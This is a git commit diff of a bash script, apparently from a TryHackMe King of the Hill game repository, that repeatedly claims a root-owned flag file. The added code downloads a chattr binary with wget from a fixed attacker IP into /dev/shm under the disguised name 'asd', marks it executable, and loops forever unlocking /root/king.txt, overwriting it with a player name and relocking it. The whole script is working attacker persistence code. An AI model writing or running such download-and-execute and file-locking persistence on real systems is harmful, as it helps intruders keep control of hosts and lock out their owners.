6a108ea4a5b7d3b41f9252e17f62e55b62199e35
Faruk <98034193+farukerdem34@users.noreply.github.com>
2023-08-29 10:58:04 -0400

    Update script.sh

--- THM-KOTH/scripts/script.sh
+++ THM-KOTH/scripts/script.sh
@@ -1,5 +1,17 @@
+#!/bin/bash
+king_path='/root/king.txt'
+fake_chattr='asd'
+fake_chattr_path='/dev/shm'
+chattr_path=$fake_chattr_path'/'$fake_chattr
+local_IP='10.8.85.10'
 while true; do
-     /dev/shm/asd -ia /root/king.txt 0>/dev/null
-     echo -n "lomarkomar" >| /root/king.txt 0>/dev/null
-     /dev/shm/asd +ia /root/king.txt 0>/dev/null
+if [[ ! -e $chattr_path ]]; then
+	cd $fake_chattr_path
+	wget $local_IP'/chattr'
+	mv $fake_chattr_path'/chattr' $chattr_path
+	chmod 100 $chattr_path
+fi 
+$chattr_path -ia $king_path
+echo 'lomarkomar' >| $king_path
+$chattr_path +ia $king_path
 done
